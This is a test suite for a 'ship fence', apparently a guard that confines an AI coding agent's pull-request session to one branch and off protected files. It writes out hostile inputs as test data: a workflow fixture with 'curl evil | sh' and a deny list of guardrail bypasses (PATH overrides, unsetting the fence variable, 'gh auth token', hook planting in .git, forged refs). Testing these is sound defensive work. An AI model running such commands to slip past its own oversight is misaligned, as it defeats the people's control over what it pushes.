import { afterEach, beforeEach, describe, expect, test } from "bun:test";
import { execFileSync, spawnSync } from "node:child_process";
import * as fs from "node:fs";
import * as path from "node:path";
import shipFence from "../ship-fence";
import { fakeContext, fakePi, privateHome, resetHome } from "../test-harness";
import type { WatchedPr } from "./fence";
import { armFence, checkPushContent, checkPushRefs, checkThread, currentState, disarmFence, FENCE_ENV, type Git, installFence, readState, realGit, type RunProgram, SHIM_DIR, stateDir } from "./fence-state";
import { checkToolCall } from "./fence-tools";

const BRANCH = "feat/ship-s1";
/** The pull request the fence is armed on in these tests. */
const PR: WatchedPr = { host: "github.com", owner: "o", repo: "r", number: 5 };
/** The pull request the stub-gh tests arm on: their calls name #7. */
const PR7: WatchedPr = { ...PR, number: 7 };
const sh = (cwd: string, ...args: string[]) => execFileSync("git", ["-c", "user.name=t", "-c", "user.email=t@t", ...args], { cwd, encoding: "utf8", env: { ...process.env, PATH: savedPath } });
const write = (file: string, text: string) => {
	fs.mkdirSync(path.dirname(file), { recursive: true });
	fs.writeFileSync(file, text);
};

let savedPath: string | undefined;
let repo: string;

/** A repo whose origin is a local bare repo: main holds a workflow and code, and the watched branch is checked out. */
function setup(): void {
	const home = privateHome();
	const bare = path.join(home, "remote.git");
	repo = path.join(home, "projects", "app");
	execFileSync("git", ["init", "--quiet", "--bare", "-b", "main", bare]);
	fs.mkdirSync(repo, { recursive: true });
	sh(repo, "init", "--quiet", "-b", "main");
	sh(repo, "remote", "add", "origin", bare);
	write(path.join(repo, ".github/workflows/ci.yml"), "name: CI\n");
	write(path.join(repo, "src/a.ts"), "export const a = 1;\n");
	sh(repo, "add", "-A");
	sh(repo, "commit", "--quiet", "-m", "init");
	sh(repo, "push", "--quiet", "origin", "main");
	sh(repo, "remote", "set-head", "origin", "main");
	sh(repo, "switch", "--quiet", "-c", BRANCH);
}

beforeEach(() => {
	resetHome();
	savedPath = process.env.PATH;
	delete process.env[FENCE_ENV];
	setup();
	installFence();
});
afterEach(() => {
	delete process.env[FENCE_ENV];
	process.env.PATH = savedPath;
});

describe("state", () => {
	test("loading names a state file, unarmed, puts the shims first once, and removes files of exited processes", () => {
		const stale = path.join(stateDir(), "999999.json");
		fs.writeFileSync(stale, "{}");
		delete process.env[FENCE_ENV];
		installFence();
		installFence();
		expect(fs.existsSync(stale)).toBe(false);
		expect(currentState().armed).toBe(false);
		const entries = (process.env.PATH ?? "").split(path.delimiter);
		expect(entries[0]).toBe(SHIM_DIR);
		expect(entries.filter(e => e === SHIM_DIR)).toHaveLength(1);
	});

	test("arming records the pull request, the branch, the git folders and the protected files; disarming keeps the file, unarmed, with no pull request", () => {
		armFence({ pushBranch: BRANCH, root: repo, pr: PR });
		const state = currentState();
		expect(state).toMatchObject({ armed: true, pushBranch: BRANCH, root: fs.realpathSync(repo), pr: PR });
		expect(Object.keys(state.snapshot)).toEqual([".github/workflows/ci.yml"]);
		expect(state.gitDirs).toContain(fs.realpathSync(path.join(repo, ".git")));
		disarmFence();
		expect(currentState()).toMatchObject({ armed: false, pushBranch: null, pr: null });
	});

	test("arming again replaces the pull request, and a state that holds none, or something else, reads as none", () => {
		armFence({ pushBranch: BRANCH, root: repo, pr: PR });
		armFence({ pushBranch: BRANCH, root: repo, pr: { ...PR, number: 9 } });
		expect(currentState().pr).toEqual({ ...PR, number: 9 });
		const file = path.join(privateHome(), "state.json");
		for (const pr of [undefined, null, "o/r#5", 5, [], {}, { ...PR, number: "5" }, { ...PR, number: 5.5 }, { ...PR, host: 1 }, { ...PR, owner: null }, { host: PR.host, owner: PR.owner, repo: PR.repo }]) {
			fs.writeFileSync(file, JSON.stringify({ armed: true, pushBranch: BRANCH, pr }));
			expect(readState(file), JSON.stringify(pr)).toMatchObject({ armed: true, pr: null });
		}
		// Only the four fields are kept.
		fs.writeFileSync(file, JSON.stringify({ armed: true, pr: { ...PR, extra: "x" } }));
		expect(readState(file).pr).toEqual(PR);
	});

	test("a missing state is unarmed; an unreadable one is armed and pushes nothing", () => {
		const bad = path.join(privateHome(), "bad.json");
		fs.writeFileSync(bad, "{");
		expect(readState(path.join(privateHome(), "missing.json")).armed).toBe(false);
		expect(readState(bad)).toMatchObject({ armed: true, pushBranch: null });
	});
});

describe("the pull request a review thread is on", () => {
	const watching = { ...readState(undefined), pr: PR };
	const thread = (number: number, owner: string, name: string) => ({ pullRequest: { number, repository: { name, owner: { login: owner } } } });
	const answers = (out: string, code = 0, err = "") => {
		const asked: [string, string[]][] = [];
		const run: RunProgram = (program, args) => (asked.push([program, args]), { code, out, err });
		return { run, asked };
	};
	const node = (found: unknown) => JSON.stringify({ data: { node: found } });

	test("a thread on the watched pull request resolves, however GitHub spells its names; the program the call runs is the one that asks, on the watched host", () => {
		const { run, asked } = answers(node(thread(5, "O", "R")));
		expect(checkThread("PRRT_a-1", "gh-blinx", watching, run)).toBeNull();
		expect(asked).toEqual([["gh-blinx", ["api", "graphql", "--hostname", "github.com", "-f", expect.stringContaining("PullRequestReviewThread"), "-f", "id=PRRT_a-1"]]]);
	});

	test("a thread on another number, another repository or another owner is refused, and says where it is", () => {
		for (const [found, on] of [[thread(6, "o", "r"), "o/r#6"], [thread(5, "x", "r"), "x/r#5"], [thread(5, "o", "y"), "o/y#5"], [thread(9, "x", "y"), "x/y#9"]] as const) {
			expect(checkThread("PRRT_a", "gh", watching, answers(node(found)).run)).toContain(`that review thread is on ${on}, not on the pull request /ship watches (o/r#5)`);
		}
	});

	test("what GitHub can't place is refused, an answer that can't be had asks to try again, and a fence with no pull request refuses", () => {
		for (const found of [null, {}, { pullRequest: null }, "x", 7]) expect(checkThread("PRRT_a", "gh", watching, answers(node(found)).run), JSON.stringify(found)).toContain("not a review thread");
		expect(checkThread("PRRT_a", "gh", watching, answers("", 1, "HTTP 502: Bad Gateway\nmore").run)).toBe("ship fence: can't tell which pull request the review thread belongs to (HTTP 502: Bad Gateway); then try again.");
		expect(checkThread("PRRT_a", "gh", watching, answers("", 1, "").run)).toContain("(exit 1)");
		expect(checkThread("PRRT_a", "gh", watching, answers("not json").run)).toContain("can't read GitHub's answer");
		const { run, asked } = answers(node(thread(5, "o", "r")));
		expect(checkThread("PRRT_a", "gh", { ...watching, pr: null }, run)).toContain("no record of the pull request /ship armed on");
		expect(asked).toEqual([]);
	});
});

describe("tool calls while armed", () => {
	const call = (toolName: string, input: Record<string, unknown>, cwd = repo) => checkToolCall(toolName, input, currentState(), cwd);
	beforeEach(() => armFence({ pushBranch: BRANCH, root: repo, pr: PR }));

	test("protected files are refused by any spelling: case, symlink, a URL-looking prefix, conflict://, the absolute name", () => {
		fs.symlinkSync(".github", path.join(repo, "ghlink"));
		fs.symlinkSync("src/a.ts", path.join(repo, "alias.ts"));
		for (const p of [".github/workflows/ci.yml", ".GITHUB/workflows/ci.yml", "ghlink/workflows/ci.yml", "x://../CLAUDE.md", "AGENTS.md", ".envrc", path.join(repo, ".github/x.yml"), "conflict://1"]) {
			expect(call("write", { path: p, content: "x" })).toContain("ship fence");
		}
		for (const p of ["src/a.ts", "alias.ts", ".env.example", "docs/github.md", path.join(privateHome(), "notes.md"), "local://plan.md"]) {
			expect(call("write", { path: p, content: "x" })).toBeNull();
		}
	});

	test("edit payloads that delete or rename into a protected file, and ast_edit over folders, patterns or lists that reach one", () => {
		expect(call("edit", { input: "*** Begin Patch\n*** Delete File: .github/workflows/ci.yml\n*** End Patch" })).toContain(".github/workflows/ci.yml");
		expect(call("edit", { path: "scratch.yml", rename: ".github/workflows/evil.yml", input: "x" })).toContain("evil.yml");
		expect(call("ast_edit", { paths: [repo] })).toContain("holds files /ship never edits");
		expect(call("ast_edit", { paths: [".github"] })).toContain(".github");
		expect(call("ast_edit", { paths: ["**/*.yml"] })).toContain("not a pattern");
		expect(call("ast_edit", { paths: "src/a.ts;lefthook.yml" })).toContain("lefthook.yml");
		expect(call("ast_edit", { paths: ["src"] })).toBeNull();
	});

	test("a linked worktree's hooks live in the main repo's git folder, and they are refused too", () => {
		const wt = path.join(privateHome(), "projects", "app-wt");
		sh(repo, "worktree", "add", "--quiet", "-b", "feat/wt", wt);
		armFence({ pushBranch: "feat/wt", root: wt, pr: PR });
		for (const p of [path.join(repo, ".git/hooks/pre-push"), "../app/.git/config", ".git"]) expect(call("write", { path: p, content: "x" }, wt)).toContain("ship fence");
	});

	test("the fence's own files are refused to tools and to shell lines", () => {
		expect(call("write", { path: path.join(SHIM_DIR, "git"), content: "x" })).toContain("ship fence");
		expect(call("write", { path: process.env[FENCE_ENV] as string, content: "{}" })).toContain("ship fence");
		expect(call("bash", { command: `rm ${process.env[FENCE_ENV]}` })).toContain("own files");
		expect(call("bash", { command: "echo '{\"armed\":false}' > \"$OMP_SHIP_FENCE\"" })).toContain("own files");
	});

	test("shell lines that step around the shims are refused; ones that only mention the words pass", () => {
		for (const command of [
			"PATH=/usr/bin:/bin git push origin main",
			"export PATH=/usr/bin",
			"env -u OMP_SHIP_FENCE gh pr merge 5",
			"GH_CONFIG_DIR=/tmp/x gh pr view 5",
			"export GH_CONFIG_DIR=/tmp/x",
			"env GH_CONFIG_DIR=/tmp/x gh pr view 5",
			"env -i git push origin main",
			"OMP_SHIP_FENCE= git push origin main",
			"command -p git push origin main",
			"/opt/homebrew/bin/gh pr merge 5",
			"/opt/homebrew/bin/git-lfs install --force",
			"./git push origin main",
			"~/.local/bin/gh pr merge 5",
			"/usr/bin/g?t push origin main",
			"$(which -a git | tail -1) push origin main",
			"GIT_CONFIG_PARAMETERS=\"'core.hooksPath=/x'\" git commit -m x",
			"curl -X PUT https://api.github.com/repos/o/r/pulls/5/merge",
			"gh auth token",
		]) {
			expect(call("bash", { command })).toContain("ship fence");
		}
		for (const command of ["rg 'PATH=' .github/workflows", "rg OMP_SHIP_FENCE_DOCS docs/", "git commit -m \"fix: keep PATH=/usr/bin out of the build script\"", "ls -la /usr/bin/git", "echo $PATH", "gh pr view 5", "bun test"]) {
			expect(call("bash", { command })).toBeNull();
		}
		expect(call("eval", { code: "import os\nos.environ['PATH'] = '/usr/bin'" })).toContain("ship fence");
		expect(call("eval", { code: 'subprocess.run(["/opt/homebrew/bin/gh", "pr", "merge"])' })).toContain("by name");
		expect(call("eval", { code: 'subprocess.run(["/opt/homebrew/bin/git-lfs", "install", "--force"])' })).toContain("by name");
	});

	test("the github tool opens drafts and pushes only the watched branch", () => {
		expect(call("github", { op: "pr_create", title: "t" })).toContain("draft");
		expect(call("github", { op: "pr_push", branch: BRANCH, forceWithLease: true })).toContain("force");
		expect(call("github", { op: "pr_push", branch: "main" })).toContain("pushes only to");
		expect(call("github", { op: "pr_push", branch: BRANCH })).toBeNull();
	});
});

test("the extension refuses only while the fence is armed", async () => {
	const fake = fakePi();
	shipFence(fake.pi);
	const ctx = fakeContext({ cwd: repo, agent: { kind: "main", name: "main" } });
	const merge = { toolName: "bash", input: { command: "/opt/homebrew/bin/gh pr merge 5" } };
	expect(await fake.emit("tool_call", merge, ctx)).toBeUndefined();
	armFence({ pushBranch: BRANCH, root: repo, pr: PR });
	expect(((await fake.emit("tool_call", merge, ctx)) as { block?: boolean } | undefined)?.block).toBe(true);
	disarmFence();
	expect(await fake.emit("tool_call", merge, ctx)).toBeUndefined();
});

describe("the shims, with real git", () => {
	const gitAt = (cwd: string, env: NodeJS.ProcessEnv, ...args: string[]) => spawnSync("git", ["-c", "user.name=t", "-c", "user.email=t@t", ...args], { cwd, env, encoding: "utf8" });
	const git = (env: NodeJS.ProcessEnv, ...args: string[]) => gitAt(repo, env, ...args);

	test("unarmed, they pass everything through; armed, they refuse another branch and let the watched one go", () => {
		expect(git(process.env, "push", "--quiet", "origin", "HEAD:refs/heads/free").status).toBe(0);
		armFence({ pushBranch: BRANCH, root: repo, pr: PR });
		const other = git(process.env, "push", "origin", "HEAD:refs/heads/other");
		expect(other.status).toBe(1);
		expect(other.stderr).toContain(`ship fence: this session pushes only to ${BRANCH}`);
		expect(git(process.env, "push", "--quiet", "origin", BRANCH).status).toBe(0);
		expect(git(process.env, "rev-parse", "--is-inside-work-tree").stdout.trim()).toBe("true");
	});

	describe("a push is judged by the repository it runs in, not by the name origin", () => {
		/** A second bare repo with its own main, and a clone of it that holds a commit on the watched branch's name. */
		const foreign = (): { bare: string; clone: string } => {
			const other = path.join(privateHome(), "other.git");
			const seed = path.join(privateHome(), "seed");
			execFileSync("git", ["init", "--quiet", "--bare", "-b", "main", other]);
			fs.mkdirSync(seed);
			sh(seed, "init", "--quiet", "-b", "main");
			sh(seed, "remote", "add", "origin", other);
			write(path.join(seed, "src/b.ts"), "export const b = 1;\n");
			sh(seed, "add", "-A");
			sh(seed, "commit", "--quiet", "-m", "init");
			sh(seed, "push", "--quiet", "origin", "main");
			const clone = path.join(privateHome(), "x");
			sh(privateHome(), "clone", "--quiet", other, clone);
			sh(clone, "switch", "--quiet", "-c", BRANCH);
			write(path.join(clone, "src/b.ts"), "export const b = 2;\n");
			sh(clone, "commit", "--quiet", "-am", "work");
			return { bare: other, clone };
		};
		const heads = (bareDir: string) => spawnSync("git", ["--git-dir", bareDir, "for-each-ref", "--format=%(refname)", "refs/heads"], { env: { ...process.env, PATH: savedPath }, encoding: "utf8" }).stdout;

		test("a clone of another repository is refused, from the armed repo with -C and from inside the clone, and nothing is sent", () => {
			armFence({ pushBranch: BRANCH, root: repo, pr: PR });
			const { bare: other, clone } = foreign();
			fs.symlinkSync(clone, path.join(privateHome(), "link"));
			for (const [cwd, args] of [[repo, ["-C", clone]], [clone, []], [repo, ["-C", path.join(privateHome(), "link")]], [repo, ["-C", clone, "-C", "src"]]] as const) {
				const push = gitAt(cwd, process.env, ...args, "push", "origin", BRANCH);
				expect(push.status, `${cwd} ${args.join(" ")}: ${push.stderr}`).toBe(1);
				expect(push.stderr).toContain("ship fence");
				expect(push.stderr).toContain("armed");
			}
			expect(heads(other)).not.toContain(BRANCH);
		});

		test("a second clone of the same origin is another repository too", () => {
			armFence({ pushBranch: BRANCH, root: repo, pr: PR });
			const mate = teammate();
			const push = gitAt(mate, process.env, "push", "origin", BRANCH);
			expect(push.status).toBe(1);
			expect(push.stderr).toContain("ship fence");
			expect(originHas(BRANCH)).toBe("");
		});

		test("the armed repository and its linked worktrees push", () => {
			sh(repo, "switch", "--quiet", "main");
			const wt = path.join(privateHome(), "projects", "app-wt");
			sh(repo, "worktree", "add", "--quiet", wt, BRANCH);
			armFence({ pushBranch: BRANCH, root: repo, pr: PR });
			write(path.join(wt, "src/a.ts"), "export const a = 2;\n");
			sh(wt, "commit", "--quiet", "-am", "from the worktree");
			const fromWorktree = gitAt(wt, process.env, "push", "--quiet", "origin", BRANCH);
			expect(fromWorktree.status, fromWorktree.stderr).toBe(0);
			expect(originHas(BRANCH)).toBe(sh(wt, "rev-parse", "HEAD").trim());
			write(path.join(wt, "src/a.ts"), "export const a = 3;\n");
			sh(wt, "commit", "--quiet", "-am", "again");
			const fromRepo = git(process.env, "-C", wt, "push", "--quiet", "origin", BRANCH);
			expect(fromRepo.status, fromRepo.stderr).toBe(0);
			const fromMain = git(process.env, "push", "--quiet", "origin", `${BRANCH}:${BRANCH}`);
			expect(fromMain.status, fromMain.stderr).toBe(0);
		});

		test("a state armed from a linked worktree lets the main repository push too", () => {
			const wt = path.join(privateHome(), "projects", "app-wt");
			sh(repo, "worktree", "add", "--quiet", "-b", "feat/wt", wt);
			armFence({ pushBranch: "feat/wt", root: wt, pr: PR });
			expect(git(process.env, "push", "--quiet", "origin", "feat/wt").status).toBe(0);
			expect(gitAt(wt, process.env, "push", "--quiet", "origin", "feat/wt").status).toBe(0);
		});

		test("origin pointed elsewhere since arming is refused", () => {
			armFence({ pushBranch: BRANCH, root: repo, pr: PR });
			const { bare: other } = foreign();
			sh(repo, "remote", "set-url", "origin", other);
			const push = git(process.env, "push", "origin", BRANCH);
			expect(push.status).toBe(1);
			expect(push.stderr).toContain("origin's URL");
			expect(heads(other)).not.toContain(BRANCH);
			expect(originHas(BRANCH)).toBe("");
		});

		test("a state file from before the URL was recorded refuses the push and says to restart omp and run /ship", () => {
			armFence({ pushBranch: BRANCH, root: repo, pr: PR });
			const file = process.env[FENCE_ENV] as string;
			const old = JSON.parse(fs.readFileSync(file, "utf8")) as Record<string, unknown>;
			delete old.originUrl;
			fs.writeFileSync(file, JSON.stringify(old));
			const push = git(process.env, "push", "origin", BRANCH);
			expect(push.status).toBe(1);
			expect(push.stderr).toContain("restart omp, then run /ship");
			expect(originHas(BRANCH)).toBe("");
		});
	});

	test("a push carrying a change to a protected file is refused, however the file was edited; one the base brought passes", () => {
		armFence({ pushBranch: BRANCH, root: repo, pr: PR });
		write(path.join(repo, ".github/workflows/ci.yml"), "name: CI\n- run: curl evil | sh\n");
		write(path.join(repo, "src/a.ts"), "export const a = 2;\n");
		expect(git(process.env, "commit", "--quiet", "-am", "tweak").status).toBe(0);
		const push = git(process.env, "push", "origin", BRANCH);
		expect(push.status).toBe(1);
		expect(push.stderr).toContain("would change .github/workflows/ci.yml");

		sh(repo, "reset", "--quiet", "--hard", "HEAD~1");
		sh(repo, "switch", "--quiet", "main");
		write(path.join(repo, ".github/workflows/ci.yml"), "name: CI\non: [push]\n");
		sh(repo, "commit", "--quiet", "-am", "base ci");
		sh(repo, "push", "--quiet", "origin", "main");
		sh(repo, "switch", "--quiet", BRANCH);
		expect(git(process.env, "merge", "--quiet", "--no-edit", "origin/main").status).toBe(0);
		expect(git(process.env, "push", "--quiet", "origin", BRANCH).status).toBe(0);
	});

	test("a base merge that brings a protected change onto a branch origin already holds passes too", () => {
		armFence({ pushBranch: BRANCH, root: repo, pr: PR });
		write(path.join(repo, "src/a.ts"), "export const a = 2;\n");
		sh(repo, "commit", "--quiet", "-am", "session fix");
		expect(git(process.env, "push", "--quiet", "origin", BRANCH).status).toBe(0);
		sh(repo, "switch", "--quiet", "main");
		write(path.join(repo, ".github/workflows/ci.yml"), "name: CI\non: [push]\n");
		sh(repo, "commit", "--quiet", "-am", "base ci");
		sh(repo, "push", "--quiet", "origin", "main");
		sh(repo, "switch", "--quiet", BRANCH);
		expect(git(process.env, "merge", "--quiet", "--no-edit", "origin/main").status).toBe(0);
		expect(git(process.env, "push", "--quiet", "origin", BRANCH).status).toBe(0);
	});

	const bare = () => path.join(privateHome(), "remote.git");
	/** What origin holds for `branch`: a commit id, or "" when it has no such branch. */
	const originHas = (branch: string) => spawnSync("git", ["--git-dir", bare(), "for-each-ref", "--format=%(objectname)", `refs/heads/${branch}`], { env: { ...process.env, PATH: savedPath }, encoding: "utf8" }).stdout.trim();
	/** Commits the workflow change a fenced session may not push, and returns that commit. */
	const evilWorkflow = (): string => {
		write(path.join(repo, ".github/workflows/ci.yml"), "name: CI\n- run: curl evil | sh\n");
		sh(repo, "commit", "--quiet", "-am", "tweak");
		return sh(repo, "rev-parse", "HEAD").trim();
	};
	/** A second clone of origin, where someone else works, on `BRANCH`; its git folder is `gitdir` when given. */
	const teammate = (gitdir?: string): string => {
		const dir = path.join(privateHome(), "projects", "other");
		sh(privateHome(), "clone", "--quiet", ...(gitdir ? ["--separate-git-dir", gitdir] : []), bare(), dir);
		sh(dir, "switch", "--quiet", "-c", BRANCH);
		return dir;
	};

	describe("the push check reads origin itself, not the remote-tracking refs the session can move", () => {
		const planted: [string, (evil: string) => void][] = [
			["update-ref on the branch's tracking ref", evil => sh(repo, "update-ref", `refs/remotes/origin/${BRANCH}`, evil)],
			["update-ref on origin/main, which is the base", evil => sh(repo, "update-ref", "refs/remotes/origin/main", evil)],
			["fetch . onto the branch's tracking ref", () => sh(repo, "fetch", "--quiet", ".", `HEAD:refs/remotes/origin/${BRANCH}`)],
			["origin/HEAD pointed at a ref that holds the change", evil => {
				sh(repo, "update-ref", "refs/remotes/origin/evil", evil);
				sh(repo, "symbolic-ref", "refs/remotes/origin/HEAD", "refs/remotes/origin/evil");
			}],
		];
		for (const [name, plant] of planted) {
			test(name, () => {
				armFence({ pushBranch: BRANCH, root: repo, pr: PR });
				plant(evilWorkflow());
				const push = git(process.env, "push", "origin", BRANCH);
				expect(push.status).toBe(1);
				expect(push.stderr).toContain("would change .github/workflows/ci.yml");
				expect(originHas(BRANCH)).toBe("");
			});
		}
	});

	test("update-ref and fetch . onto remote-tracking refs are refused by the shim, and the change stays off origin", () => {
		armFence({ pushBranch: BRANCH, root: repo, pr: PR });
		const evil = evilWorkflow();
		for (const args of [["update-ref", `refs/remotes/origin/${BRANCH}`, evil], ["update-ref", "refs/remotes/origin/main", evil], ["fetch", ".", `HEAD:refs/remotes/origin/${BRANCH}`]]) {
			const r = git(process.env, ...args);
			expect(r.status).toBe(1);
			expect(r.stderr).toContain("ship fence");
		}
		expect(sh(repo, "for-each-ref", "--format=%(objectname)", "refs/remotes")).not.toContain(evil);
		expect(git(process.env, "push", "origin", BRANCH).status).toBe(1);
		expect(originHas(BRANCH)).toBe("");
	});

	test("a replacement ref does not show the push check another tree than the one the push sends", () => {
		armFence({ pushBranch: BRANCH, root: repo, pr: PR });
		const benign = sh(repo, "rev-parse", "HEAD").trim();
		const evil = evilWorkflow();
		expect(git(process.env, "update-ref", `refs/replace/${evil}`, benign).status).toBe(1);
		sh(repo, "update-ref", `refs/replace/${evil}`, benign);
		const push = git(process.env, "push", "origin", BRANCH);
		expect(push.status).toBe(1);
		expect(push.stderr).toContain("would change .github/workflows/ci.yml");
		expect(originHas(BRANCH)).toBe("");
	});

	test("only origin's own branch counts as its tip: ls-remote also lists refs whose name merely ends the same way", () => {
		armFence({ pushBranch: BRANCH, root: repo, pr: PR });
		const evil = evilWorkflow();
		// Someone else put the change on a branch named like the watched one's full ref name.
		sh(repo, "push", "--quiet", "origin", `${evil}:refs/heads/refs/heads/${BRANCH}`);
		const push = git(process.env, "push", "origin", BRANCH);
		expect(push.status).toBe(1);
		expect(push.stderr).toContain("would change .github/workflows/ci.yml");
		expect(originHas(BRANCH)).toBe("");
	});

	test("a push that git would land on another ref of origin is refused, and the dry run names that ref", () => {
		armFence({ pushBranch: BRANCH, root: repo, pr: PR });
		// origin holds a branch named `refs/heads/<branch>`: with the watched branch not there yet, git matches the push to it by its tail.
		sh(repo, "push", "--quiet", "origin", `HEAD:refs/heads/refs/heads/${BRANCH}`);
		const first = sh(repo, "rev-parse", "HEAD").trim();
		write(path.join(repo, "src/a.ts"), "export const a = 2;\n");
		sh(repo, "commit", "--quiet", "-am", "next");
		const push = git(process.env, "push", "origin", BRANCH);
		expect(push.status).toBe(1);
		expect(push.stderr).toContain(`refs/heads/refs/heads/${BRANCH}`);
		expect(originHas(BRANCH)).toBe("");
		expect(originHas(`refs/heads/${BRANCH}`)).toBe(first);
	});

	test("moving a protected file away is a change to it", () => {
		armFence({ pushBranch: BRANCH, root: repo, pr: PR });
		fs.mkdirSync(path.join(repo, "docs"));
		sh(repo, "mv", ".github/workflows/ci.yml", "docs/ci.yml");
		sh(repo, "commit", "--quiet", "-m", "move the workflow");
		const push = git(process.env, "push", "origin", BRANCH);
		expect(push.status).toBe(1);
		expect(push.stderr).toContain("would change .github/workflows/ci.yml");
		expect(originHas(BRANCH)).toBe("");
	});

	test("git that writes where it is told does not write into the git folder, however it is reached", () => {
		armFence({ pushBranch: BRANCH, root: repo, pr: PR });
		const hooks = path.join(repo, ".git", "hooks");
		const template = path.join(privateHome(), "template");
		write(path.join(template, "hooks", "pre-commit"), "#!/bin/sh\nexit 0\n");
		fs.chmodSync(path.join(template, "hooks", "pre-commit"), 0o755);
		fs.symlinkSync(".git/hooks", path.join(repo, "hk"));
		for (const args of [
			["diff", "--output=.git/hooks/pre-commit"],
			["archive", "-o", ".git/hooks/pre-commit", "HEAD"],
			["checkout-index", "--prefix=.git/hooks/", "-a"],
			["bundle", "create", ".git/hooks/pre-commit", "HEAD"],
			["init", `--template=${template}`],
			// Running init again copies the templates in, however they are named.
			["init"],
			["-c", `init.templateDir=${template}`, "init"],
			["-C", "src", "archive", "-o", "../.git/hooks/pre-commit", "HEAD"],
			["archive", "-o", path.join(hooks, "pre-commit"), "HEAD"],
			["archive", "-o", "hk/pre-commit", "HEAD"],
			["--work-tree=.git/hooks", "checkout", "HEAD", "--", "src/a.ts"],
			// A `..` after a symlink leaves the link's target, so these reach .git itself.
			["checkout-index", "--prefix=hk/../", "-f", "src/a.ts"],
			["-C", "hk/..", "archive", "-o", "config", "HEAD"],
			// Commands that create or fill a file at a path they are given; a long option by a prefix, a short one in a bundle, an option given twice.
			["mailinfo", ".git/hooks/pre-commit", "/dev/null"],
			["mv", "src/a.ts", ".git/hooks/pre-commit"],
			["clone", bare(), ".git/hooks/clone"],
			["config", "--file", ".git/hooks/pre-push", "core.x", "y"],
			["format-patch", "--output-directory=.git/hooks", "-1"],
			["checkout-index", "--pre=.git/hooks/", "-a"],
			["archive", "-qo.git/hooks/pre-commit", "HEAD"],
			["diff", `--output=${path.join(privateHome(), "d.patch")}`, "--output=.git/hooks/pre-commit"],
		]) {
			const r = git(process.env, ...args);
			expect(r.status).toBe(1);
			expect(r.stderr).toContain("ship fence");
		}
		const viaEnv = git({ ...process.env, GIT_TEMPLATE_DIR: template }, "init");
		expect(viaEnv.status).toBe(1);
		expect(viaEnv.stderr).toContain("ship fence");
		// A fresh folder is none of the fence's business.
		expect(git(process.env, "init", "--quiet", path.join(privateHome(), "fresh")).status).toBe(0);
		const inside = spawnSync("git", ["archive", "-o", "pre-commit", "HEAD"], { cwd: hooks, env: process.env, encoding: "utf8" });
		expect(inside.status).toBe(1);
		expect(fs.readdirSync(hooks).filter(name => !name.endsWith(".sample"))).toEqual([]);
		expect(fs.existsSync(path.join(repo, ".git", "src"))).toBe(false);
		expect(sh(repo, "config", "--get", "remote.origin.url")).toContain("remote.git");
	});

	test("commands that only mention .git in a pattern or a message run while armed", () => {
		armFence({ pushBranch: BRANCH, root: repo, pr: PR });
		write(path.join(repo, "docs.md"), "see .git/hooks\n");
		sh(repo, "add", "-A");
		for (const args of [
			["grep", "-n", ".git/hooks"],
			["log", "-S.git", "--oneline"],
			["log", "--grep=/.git/", "--oneline"],
			["commit", "-q", "-m", "…/.git/…"],
			["commit", "-q", "--allow-empty", "-am", "docs: why /.git/ stays out of the tree"],
			["rev-parse", "--git-path", "hooks/pre-commit"],
		]) {
			const r = git(process.env, ...args);
			expect(r.stderr, args.join(" ")).not.toContain("ship fence");
			expect(r.status, args.join(" ")).toBe(0);
		}
	});

	test("a push run against another repo with --git-dir is refused, so the check always reads the repo that pushes", () => {
		const gitdir = path.join(privateHome(), "other-gd");
		const other = teammate(gitdir);
		write(path.join(other, ".github/workflows/ci.yml"), "name: CI\n- run: curl evil | sh\n");
		sh(other, "commit", "--quiet", "-am", "tweak");
		armFence({ pushBranch: BRANCH, root: repo, pr: PR });
		const push = git(process.env, "--git-dir", gitdir, "push", "origin", BRANCH);
		expect(push.status).toBe(1);
		expect(push.stderr).toContain("--git-dir");
		expect(originHas(BRANCH)).toBe("");
	});

	/** What a refusal tells the session to run, `run git <args>;`, as an argv for git. */
	const namedFetch = (stderr: string): string[] => {
		const command = /run git (fetch origin [^;]+);/.exec(stderr)?.[1];
		expect(command, stderr).toBeDefined();
		return (command as string).split(" ");
	};

	test("a push waits for the fetch it names while origin holds a commit this checkout lacks; then it goes", () => {
		const other = teammate();
		write(path.join(other, "src/b.ts"), "export const b = 1;\n");
		sh(other, "add", "-A");
		sh(other, "commit", "--quiet", "-m", "teammate");
		sh(other, "push", "--quiet", "origin", BRANCH);
		armFence({ pushBranch: BRANCH, root: repo, pr: PR });
		write(path.join(repo, "src/a.ts"), "export const a = 2;\n");
		sh(repo, "commit", "--quiet", "-am", "mine");
		const blocked = git(process.env, "push", "origin", BRANCH);
		expect(blocked.status).toBe(1);
		expect(blocked.stderr).toContain(`run git fetch origin ${BRANCH};`);
		expect(blocked.stderr).not.toContain("This is final");
		expect(git(process.env, ...namedFetch(blocked.stderr)).status).toBe(0);
		expect(git(process.env, "merge", "--quiet", "--no-edit", `origin/${BRANCH}`).status).toBe(0);
		expect(git(process.env, "push", "--quiet", "origin", BRANCH).status).toBe(0);

		write(path.join(other, "README.md"), "base moved\n");
		sh(other, "add", "-A");
		sh(other, "commit", "--quiet", "-m", "base moves");
		sh(other, "push", "--quiet", "origin", "HEAD:refs/heads/main");
		write(path.join(repo, "src/a.ts"), "export const a = 3;\n");
		sh(repo, "commit", "--quiet", "-am", "mine again");
		const behind = git(process.env, "push", "origin", BRANCH);
		expect(behind.stderr).toContain("run git fetch origin main;");
		expect(git(process.env, ...namedFetch(behind.stderr)).status).toBe(0);
		expect(git(process.env, "push", "--quiet", "origin", BRANCH).status).toBe(0);
	});

	describe("a clone that holds only the watched branch lacks origin's default branch, which a plain `git fetch origin` never brings", () => {
		/**
		 * Origin's main moves on after the branch left it; the clone then takes the branch alone, as `git clone --single-branch --branch`
		 * or `--depth 1` does. --no-local makes it fetch like a remote clone instead of copying every object.
		 */
		function partialClone(...flags: string[]): { dir: string; other: string } {
			write(path.join(repo, "src/b.ts"), "export const b = 1;\n");
			sh(repo, "add", "-A");
			sh(repo, "commit", "--quiet", "-m", "branch work");
			sh(repo, "push", "--quiet", "origin", BRANCH);
			const other = teammate();
			write(path.join(other, "README.md"), "base moved\n");
			sh(other, "add", "-A");
			sh(other, "commit", "--quiet", "-m", "base moves");
			sh(other, "push", "--quiet", "origin", "HEAD:refs/heads/main");
			const dir = path.join(privateHome(), "projects", "partial");
			sh(privateHome(), "clone", "--quiet", "--no-local", ...flags, "--branch", BRANCH, bare(), dir);
			expect(spawnSync("git", ["cat-file", "-e", `${sh(other, "rev-parse", "HEAD").trim()}^{commit}`], { cwd: dir }).status).not.toBe(0);
			return { dir, other };
		}

